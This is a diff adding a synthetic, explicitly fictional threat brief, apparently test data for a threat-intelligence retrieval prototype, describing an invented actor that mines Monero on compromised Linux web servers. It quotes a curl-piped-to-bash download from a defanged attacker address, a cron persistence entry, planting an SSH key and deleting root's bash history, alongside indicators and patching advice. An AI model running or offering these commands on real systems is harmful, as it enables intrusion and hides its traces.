@@ -1,0 +1,40 @@
+Threat Brief: COPPER MOLE cryptomining on Linux servers
+Synthetic sample written for testing the CTI-RAG prototype. All names, hosts and indicators are fictional.
+Date: 2026-10-03 | TLP:CLEAR
+
+Summary
+COPPER MOLE compromises Linux web servers and installs a Monero miner.
+
+Initial access
+The actor exploited a remote code execution flaw in an internet-facing web application that had not been patched.
+
+Execution
+Through the vulnerable application, the actor ran a shell one-liner that piped a remote script into bash:
+
+curl -fsSL hxxp://198.51.100[.]77/k.sh | bash
+
+The script k.sh downloaded the miner binary to /tmp/.cache/kworkerd and made it executable:
+
+chmod +x /tmp/.cache/kworkerd
+
+Persistence
+The actor added a cron job that restarts the miner every 10 minutes:
+
+*/10 * * * * /tmp/.cache/kworkerd --config /tmp/.cache/c.json
+
+They also appended an attacker-controlled SSH public key to /root/.ssh/authorized_keys to keep access.
+
+Defense evasion
+The script killed competing miners and deleted the bash history of the root user with history -c and rm -f /root/.bash_history.
+
+Impact
+The miner used about 90% of the CPU and connected to the mining pool pool.copper-mole[.]example on port 443.
+
+Indicators of compromise
+- k.sh SHA256: d4e880965e9c95fec7a802ba3f7296d567018f8dbd7086079584ac8fa01a7a29
+- kworkerd SHA256: 85fe0e406bb0c38c8c18ea3c76af2e83f26f289fd9af4eb53e3c3c5ab2e34cd3
+- 198.51.100[.]77
+- pool.copper-mole[.]example
+
+Recommendations
+Patch internet-facing applications, monitor cron and authorized_keys changes, and alert on sustained high CPU usage.
